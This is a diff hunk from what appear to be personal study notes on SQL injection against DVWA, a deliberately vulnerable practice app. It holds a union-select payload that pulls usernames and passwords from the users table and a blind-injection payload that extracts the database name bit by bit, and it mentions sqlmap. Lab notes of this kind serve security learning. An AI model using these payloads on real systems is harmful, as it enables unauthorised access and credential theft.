@@ -165,7 +165,7 @@ Spli  --input parameter is char
 		# to get the content of a table
 			id=1 union select user,password from dvwa.users#&Submit=Submit
 sqli bind # only got true or false result, so use 'and ' or 'or'. so transfer the select result to binary format of ASCII string, tell the bit 1 by 1
-	1' and substring(bin(ASCII(substring(database(),1,1))),1,1)>0#         #change the last second num to move the index of ASCII string/
+	1 and substring(bin(ASCII(substring(database(),1,1))),1,1)>0#         #change the last second num to move the index of ASCII string/
 			
 			
 	sqlmap
